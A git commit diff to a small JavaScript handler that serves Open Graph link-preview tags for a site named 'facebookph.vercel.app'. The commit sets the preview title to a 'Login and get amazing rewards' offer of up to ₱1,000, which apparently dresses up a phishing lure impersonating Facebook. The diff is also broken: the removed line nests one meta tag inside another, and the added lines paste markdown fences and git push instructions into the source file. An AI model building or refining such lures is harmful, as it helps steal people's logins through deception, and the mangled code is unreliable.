4bd654ccb08d55755ea2faef879de0f2e7811008
kirtdave <kirtdave4@gmail.com>
2026-02-19 10:46:39 +0800

    update title

--- api/og.js
+++ api/og.js
@@ -12,8 +12,7 @@ export default function handler(req, res) {
 <head>
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://facebookph.vercel.app/" />
-  <meta property="og:title" content="facebook" />
-  <meta property="og:description" content="<meta property="og:description" content="Login and get amazing rewards that are up to ₱1,000" />" />
+  <meta property="og:title" content="Login and get amazing rewards that are up to ₱1,000" />
   <meta property="og:image" content="https://facebookph.vercel.app/template.png" />
   <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:image" content="https://facebookph.vercel.app/template.png" />
@@ -21,3 +20,10 @@ export default function handler(req, res) {
 <body></body>
 </html>`);
 }
+```
+
+Then push:
+```
+git add .
+git commit -m "update title"
+git push
